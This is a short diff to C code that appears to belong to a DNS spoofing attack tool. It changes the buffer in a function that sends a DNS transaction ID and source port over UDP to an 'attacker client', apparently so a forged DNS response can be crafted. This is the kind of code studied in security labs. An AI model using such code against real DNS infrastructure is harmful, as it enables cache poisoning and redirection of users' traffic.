@@ -116,7 +116,7 @@ int create_dns_response(uint32_t txid, const char* query_name) {
 void send_to_attacker_client(uint32_t txid, uint16_t source_port) {
     printf("send to attacker client\n");
     struct sockaddr_in client_addr;
-    char message[64];
+    char message[66];
 
     // Create a UDP socket
     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -138,7 +138,6 @@ void send_to_attacker_client(uint32_t txid, uint16_t source_port) {
     // Prepare the message
     snprintf(message, sizeof(message), "TXID: %u, Source Port: %u", txid, source_port);
     
-
     // Send the message
     if (sendto(sockfd, message, strlen(message), 0, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
         perror("Failed to send data to attacker’s client");
